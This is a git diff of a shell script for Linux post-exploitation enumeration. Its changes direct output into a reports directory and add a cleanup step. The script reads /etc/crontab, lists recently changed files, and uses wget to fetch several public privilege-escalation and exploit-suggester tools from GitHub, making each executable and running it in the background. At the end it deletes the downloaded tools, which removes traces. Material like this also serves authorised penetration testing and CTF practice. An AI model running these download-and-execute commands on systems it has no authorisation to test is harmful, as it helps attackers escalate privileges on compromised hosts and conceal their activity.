@@ -42,24 +42,26 @@ cat /etc/crontab 
 #Check files modified since we got on 
 find / \( -path /proc -prune -o -path /sys -prune \) -o -mmin -15 -type f -print |  xargs ls -latr
 
-
+echo "\n\n-----SURVEY COMMANDS COMPLETE -----%r%r"
 
 #ENUMERATION SCRIPTS
+
+mkdir reports
 
 #LinEnum
 wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O linenum.sh
 chmod +x linenum.sh
-./linenum.sh -t > linenum.txt &
+./linenum.sh -t > reports/linenum.txt &
 
 #LinPrivCheck
 wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py -O linpriv.py
 chmod +x linpriv.py
-./linpriv.py > linpriv.txt &
+./linpriv.py > reports/linpriv.txt &
 
 #UnixPrivCheck
 wget https://raw.githubusercontent.com/pentestmonkey/unix-privesc-check/master/upc.sh -O upc.sh
 chmod +x upc.sh
-./upc.sh > upc.txt &
+./upc.sh > reports/upc.txt &
 
 
 #PRIVESC AND EXPLOIT SCRIPTS
@@ -67,11 +69,14 @@ chmod +x upc.sh
 #Download and run LES - checks for kernel exploits and LPE's 
 wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh
 chmod +x les.sh
-./les.sh > les.txt &
+./les.sh > reports/les.txt &
 
 #LinExpSugg
 wget https://raw.githubusercontent.com/InteliSecureLabs/Linux_Exploit_Suggester/master/Linux_Exploit_Suggester.pl -O expsug.pl
 chmod +x expsug.pl
-./expsug.pl > expsug.txt &
+./expsug.pl > reports/expsug.txt &
+
+echo "Script completed. Check reports directory for script outputs."
+rm linenum.sh linpriv.py upc.sh les.sh expsug.pl
 
 
